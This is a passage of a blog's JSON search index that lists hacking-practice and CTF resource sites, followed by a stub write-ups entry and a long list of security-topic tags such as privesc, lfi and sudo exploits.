Cyber security write-ups, exploits and intro about verious topics like ROP (Return Oriented Programming), web exploitation, binary exploitation, reverse engineering, OSCP…\n  Other compilations:   Captf: List of CTF sites classified as recommended, others, meta, webapp, forensics, recruiting and paid. They also provide donloadable offline games and virtual machines you can download to train with. You can visit their main directory - http://captf.com to explore annual collections since 2004.\n  CTFS repo: Compilation of challenges and write-ups classified by year.\n  Amanhardikar’s mindmap: Penetration testing practice lab - vulnerable apps / systems. This one is huge as you will notice.\n  Compilation of hacking sites covering a wide variety of topics:\n  Razvioverflow\n  Readings:  Reverse engineering reading list:  ","id":18,"section":"posts","summary":"Have you ever wondered where to start hacking, acquire more hacking knowledge and even train, test and improve your hacking skills? Here is a compilation, collection, list, directory of the best sites that will help you. The sites listed below will help you understand and practice every aspect of the secure (or rather insecure) side of software, networks (networking), servers and every single element that may be exposed in the(our) binary world.","tags":["hacking","practice"],"title":"List of hacking sites","uri":"https://fmash16.github.io/2020/02/sites/","year":"2020"},{"content":"Hello Hello from fahim\n","id":19,"section":"writeups","summary":"Hello Hello from fahim","tags":null,"title":"Writeups","uri":"https://fmash16.github.io/writeups/writeups/","year":"2020"}],"tags":[{"title":"ad","uri":"https://fmash16.github.io/tags/ad/"},{"title":"adminer","uri":"https://fmash16.github.io/tags/adminer/"},{"title":"azure","uri":"https://fmash16.github.io/tags/azure/"},{"title":"azure ad connect","uri":"https://fmash16.github.io/tags/azure-ad-connect/"},{"title":"bludit cms","uri":"https://fmash16.github.io/tags/bludit-cms/"},{"title":"brainfuck","uri":"https://fmash16.github.io/tags/brainfuck/"},{"title":"cewl","uri":"https://fmash16.github.io/tags/cewl/"},{"title":"command injection","uri":"https://fmash16.github.io/tags/command-injection/"},{"title":"crackmapexec","uri":"https://fmash16.github.io/tags/crackmapexec/"},{"title":"cron","uri":"https://fmash16.github.io/tags/cron/"},{"title":"crontab","uri":"https://fmash16.github.io/tags/crontab/"},{"title":"CVE-2019-14287","uri":"https://fmash16.github.io/tags/cve-2019-14287/"},{"title":"dll","uri":"https://fmash16.github.io/tags/dll/"},{"title":"dns","uri":"https://fmash16.github.io/tags/dns/"},{"title":"dnsadmins","uri":"https://fmash16.github.io/tags/dnsadmins/"},{"title":"docker","uri":"https://fmash16.github.io/tags/docker/"},{"title":"dynamic js","uri":"https://fmash16.github.io/tags/dynamic-js/"},{"title":"dynamic xss","uri":"https://fmash16.github.io/tags/dynamic-xss/"},{"title":"easy","uri":"https://fmash16.github.io/tags/easy/"},{"title":"evil-winrm","uri":"https://fmash16.github.io/tags/evil-winrm/"},{"title":"file descriptor","uri":"https://fmash16.github.io/tags/file-descriptor/"},{"title":"ftp","uri":"https://fmash16.github.io/tags/ftp/"},{"title":"fuzzing","uri":"https://fmash16.github.io/tags/fuzzing/"},{"title":"Gila CMS","uri":"https://fmash16.github.io/tags/gila-cms/"},{"title":"gtfobins","uri":"https://fmash16.github.io/tags/gtfobins/"},{"title":"hacking","uri":"https://fmash16.github.io/tags/hacking/"},{"title":"hydra","uri":"https://fmash16.github.io/tags/hydra/"},{"title":"injection","uri":"https://fmash16.github.io/tags/injection/"},{"title":"john","uri":"https://fmash16.github.io/tags/john/"},{"title":"kvm","uri":"https://fmash16.github.io/tags/kvm/"},{"title":"ldap","uri":"https://fmash16.github.io/tags/ldap/"},{"title":"ldapsearch","uri":"https://fmash16.github.io/tags/ldapsearch/"},{"title":"lfi","uri":"https://fmash16.github.io/tags/lfi/"},{"title":"linux","uri":"https://fmash16.github.io/tags/linux/"},{"title":"logrotate race condition","uri":"https://fmash16.github.io/tags/logrotate-race-condition/"},{"title":"mysql","uri":"https://fmash16.github.io/tags/mysql/"},{"title":"mysqldump","uri":"https://fmash16.github.io/tags/mysqldump/"},{"title":"passthrough","uri":"https://fmash16.github.io/tags/passthrough/"},{"title":"php","uri":"https://fmash16.github.io/tags/php/"},{"title":"powershell","uri":"https://fmash16.github.io/tags/powershell/"},{"title":"practice","uri":"https://fmash16.github.io/tags/practice/"},{"title":"privesc","uri":"https://fmash16.github.io/tags/privesc/"},{"title":"pt_chown","uri":"https://fmash16.github.io/tags/pt_chown/"},{"title":"pwn","uri":"https://fmash16.github.io/tags/pwn/"},{"title":"python","uri":"https://fmash16.github.io/tags/python/"},{"title":"python path hijack","uri":"https://fmash16.github.io/tags/python-path-hijack/"},{"title":"qemu","uri":"https://fmash16.github.io/tags/qemu/"},{"title":"rce","uri":"https://fmash16.github.io/tags/rce/"},{"title":"real world","uri":"https://fmash16.github.io/tags/real-world/"},{"title":"rpcclient","uri":"https://fmash16.github.io/tags/rpcclient/"},{"title":"sql","uri":"https://fmash16.github.io/tags/sql/"},{"title":"sql truncation attack","uri":"https://fmash16.github.io/tags/sql-truncation-attack/"},{"title":"stego","uri":"https://fmash16.github.io/tags/stego/"},{"title":"subdomain","uri":"https://fmash16.github.io/tags/subdomain/"},{"title":"sudo","uri":"https://fmash16.github.io/tags/sudo/"},{"title":"sudo privesc","uri":"https://fmash16.github.io/tags/sudo-privesc/"},{"title":"tar","uri":"https://fmash16.github.io/tags/tar/"},{"title":"virtualization","uri":"https://fmash16.github.io/tags/virtualization/"},{"title":"web","uri":"https://fmash16.github.io/tags/web/"},{"title":"wfuzz","uri":"https://fmash16.github.io/tags/wfuzz/"},{"title":"wildcard","uri":"https://fmash16.github.io/tags/wildcard/"},{"title":"xss","uri":"https://fmash16.github.io/tags/xss/"}]}